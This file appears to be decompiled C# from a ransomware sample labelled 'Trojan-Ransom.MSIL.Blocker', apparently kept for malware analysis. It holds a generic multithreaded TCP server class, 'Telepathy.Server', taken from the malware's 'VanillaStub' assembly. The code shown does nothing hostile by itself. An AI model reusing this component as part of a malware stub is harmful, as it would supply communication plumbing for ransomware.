// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Telepathy.Server
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace VanillaStub.Helpers.Telepathy
{
  public class Server : Common
  {
    private static int counter;
    private readonly ConcurrentDictionary<int, Server.ClientToken> clients = new ConcurrentDictionary<int, Server.ClientToken>();
    public TcpListener listener;
    private Thread listenerThread;

    public bool Active => this.listenerThread != null && this.listenerThread.IsAlive;

    public static int NextConnectionId()
    {
      int num = Interlocked.Increment(ref Server.counter);
      return num != int.MaxValue ? num : throw new Exception("connection id limit reached: " + (object) num);
    }

    private void Listen(int port)
    {
      try
      {
        this.listener = new TcpListener(new IPEndPoint(IPAddress.Any, port));
        this.listener.Server.NoDelay = this.NoDelay;
        this.listener.Server.SendTimeout = this.SendTimeout;
        this.listener.Start();
        Logger.Log("Server: listening port=" + (object) port);
        while (true)
        {
          TcpClient client = this.listener.AcceptTcpClient();
          int connectionId = Server.NextConnectionId();
          Server.ClientToken token = new Server.ClientToken(client);
          this.clients[connectionId] = token;
          Thread sendThread = new Thread((ThreadStart) (() =>
          {
            try
            {
              Common.SendLoop(connectionId, client, token.sendQueue, token.sendPending);
            }
            catch (ThreadAbortException ex)
            {
            }
            catch (Exception ex)
            {
              Logger.LogError("Server send thread exception: " + (object) ex);
            }
          }));
          sendThread.IsBackground = true;
          sendThread.Start();
          new Thread((ThreadStart) (() =>
          {
            try
            {
              Common.ReceiveLoop(connectionId, client, this.receiveQueue, this.MaxMessageSize);
              this.clients.TryRemove(connectionId, out Server.ClientToken _);
              sendThread.Interrupt();
            }
            catch (Exception ex)
            {
              Logger.LogError("Server client thread exception: " + (object) ex);
            }
          }))
          {
            IsBackground = true
          }.Start();
        }
      }
      catch (ThreadAbortException ex)
      {
        Logger.Log("Server thread aborted. That's okay. " + (object) ex);
      }
      catch (SocketException ex)
      {
        Logger.Log("Server Thread stopped. That's okay. " + (object) ex);
      }
      catch (Exception ex)
      {
        Logger.LogError("Server Exception: " + (object) ex);
      }
    }

    public bool Start(int port)
    {
      if (this.Active)
        return false;
      this.receiveQueue = new ConcurrentQueue<Message>();
      Logger.Log("Server: Start port=" + (object) port);
      this.listenerThread = new Thread((ThreadStart) (() => this.Listen(port)));
      this.listenerThread.IsBackground = true;
      this.listenerThread.Priority = ThreadPriority.BelowNormal;
      this.listenerThread.Start();
      return true;
    }

    public void Stop()
    {
      if (!this.Active)
        return;
      Logger.Log("Server: stopping...");
      this.listener?.Stop();
      this.listenerThread?.Interrupt();
      this.listenerThread = (Thread) null;
      foreach (KeyValuePair<int, Server.ClientToken> client1 in this.clients)
      {
        TcpClient client2 = client1.Value.client;
        try
        {
          client2.GetStream().Close();
        }
        catch
        {
        }
        client2.Close();
      }
      this.clients.Clear();
    }

    public bool Send(int connectionId, byte[] data)
    {
      if (data.Length <= this.MaxMessageSize)
      {
        Server.ClientToken clientToken;
        if (this.clients.TryGetValue(connectionId, out clientToken))
        {
          clientToken.sendQueue.Enqueue(data);
          clientToken.sendPending.Set();
          return true;
        }
        Logger.Log("Server.Send: invalid connectionId: " + (object) connectionId);
        return false;
      }
      Logger.LogError("Client.Send: message too big: " + (object) data.Length + ". Limit: " + (object) this.MaxMessageSize);
      return false;
    }

    public string GetClientAddress(int connectionId)
    {
      Server.ClientToken clientToken;
      return this.clients.TryGetValue(connectionId, out clientToken) ? ((IPEndPoint) clientToken.client.Client.RemoteEndPoint).Address.ToString() : "";
    }

    public bool Disconnect(int connectionId)
    {
      Server.ClientToken clientToken;
      if (!this.clients.TryGetValue(connectionId, out clientToken))
        return false;
      clientToken.client.Close();
      Logger.Log("Server.Disconnect connectionId:" + (object) connectionId);
      return true;
    }

    private class ClientToken
    {
      public readonly TcpClient client;
      public readonly ManualResetEvent sendPending = new ManualResetEvent(false);
      public readonly SafeQueue<byte[]> sendQueue = new SafeQueue<byte[]>();

      public ClientToken(TcpClient client) => this.client = client;
    }
  }
}
